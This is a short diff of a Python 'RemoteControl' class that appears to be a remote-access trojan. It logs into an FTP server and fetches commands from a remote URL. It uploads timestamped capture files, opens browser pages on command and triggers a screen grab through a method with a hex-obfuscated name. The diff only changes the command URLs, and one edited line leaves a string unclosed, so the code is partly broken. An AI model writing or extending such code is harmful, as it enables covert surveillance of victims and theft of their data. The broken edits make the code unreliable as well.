@@ -54,7 +54,7 @@ class RemoteControl:
                 ksk=datetime.datetime.now()
 
                 session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
-                url=requests.get("https://yourftpsite.ftpserver.com/programs.txt")
+                url=requests.get("https://yourftpsite.ftpserver.com/programs")
                 a=url.text
                 f=open(a,"rb")
                 session.storbinary("STOR capture{0}.txt".format(str(ksk)),f)
@@ -137,7 +137,7 @@ class RemoteControl:
 
     def navigate():
             session=ftplib.FTP('files.ftpserver.com','yourftpsite','yourftppassword')
-            r=requests.get("https://yourftpsite.ftpserver.com/commands.txt")
+            r=requests.get("https://yourftpsite.ftpserver.com/commands.file)
             t=r.text
             webbrowser.open(t,new=2)
             sleep(30)
@@ -147,7 +147,7 @@ class RemoteControl:
 
     def getCommands(self):
         session=ftplib.FTP('files.0ftpserver.com','yourftpsite','yourftppassword')
-        r=requests.get("https://yourftpsite.ftpserver.com/commands.txt")
+        r=requests.get("https://yourftpsite.ftpserver.com/commands")
         t=r.text
         if "grab screen" in t:
             RemoteControl.a6772616253637265656e0d0a()
